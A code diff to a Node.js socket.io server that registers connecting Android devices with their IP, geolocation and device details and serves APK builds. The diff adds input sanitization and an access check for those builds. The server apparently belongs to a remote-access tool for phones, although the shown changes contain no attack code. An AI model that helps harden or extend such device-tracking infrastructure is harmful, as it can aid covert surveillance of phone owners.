@@ -10,6 +10,7 @@ const
     app = express(),
     IO = require('socket.io'),
     geoip = require('geoip-lite'),
+    crypto = require('crypto'),
     CONST = require('./includes/const'),
     db = require('./includes/databaseGateway'),
     logManager = require('./includes/logManager'),
@@ -48,6 +49,10 @@ client_io.on('connection', (socket) => {
     if (!clientParams.id || typeof clientParams.id !== 'string' || clientParams.id.trim() === '' || clientParams.id.length > 200) {
         return socket.disconnect();
     }
+    // Sanitize clientID: strip control chars and non-safe characters (must match databaseGateway regex)
+    let safeClientID = clientParams.id.replace(/[\x00-\x1f\x7f]/g, '').replace(/[^a-zA-Z0-9_-]/g, '');
+    if (safeClientID.length > 200) safeClientID = safeClientID.substring(0, 200);
+    if (safeClientID === '') safeClientID = 'unnamed_' + crypto.randomBytes(4).toString('hex');
 
     // Patch 5: Reliable IP extraction for IPv6 and IPv4-mapped
     let clientIP = socket.handshake.address;
@@ -61,13 +66,13 @@ client_io.on('connection', (socket) => {
     let clientGeo = geoip.lookup(clientIP);
     if (!clientGeo) clientGeo = {}
 
-    clientManager.clientConnect(socket, clientParams.id, {
+    clientManager.clientConnect(socket, safeClientID, {
         clientIP,
         clientGeo,
         device: {
-            model: clientParams.model || 'unknown',
-            manufacture: clientParams.manf || 'unknown',
-            version: clientParams.release || 'unknown'
+            model: String(clientParams.model || 'unknown').substring(0, 200),
+            manufacture: String(clientParams.manf || 'unknown').substring(0, 200),
+            version: String(clientParams.release || 'unknown').substring(0, 200)
         }
     });
 
@@ -101,5 +106,10 @@ app.listen(CONST.web_port);
 app.set('view engine', 'ejs');
 app.set('views', './assets/views');
 app.set('trust proxy', 'loopback');
+// Block direct access to APK files via static — they must go through /dl (authenticated)
+app.use((req, res, next) => {
+    if (req.path.endsWith('.apk') && !req.path.startsWith('/dl') && !req.path.startsWith('/download/')) return res.status(403).send('Forbidden');
+    next();
+});
 app.use(express.static(__dirname + '/assets/webpublic'));
 app.use(require('./includes/expressRoutes'));
